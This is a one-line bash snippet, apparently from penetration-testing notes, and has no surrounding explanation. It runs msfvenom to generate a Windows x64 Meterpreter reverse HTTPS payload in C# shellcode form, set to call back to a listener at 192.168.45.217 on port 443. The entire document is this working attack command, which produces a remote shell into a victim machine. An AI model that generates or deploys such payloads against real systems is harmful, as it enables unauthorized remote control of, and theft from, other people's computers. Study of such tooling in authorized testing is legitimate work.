```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.217 LPORT=443 EXITFUNC=thread -f csharp
```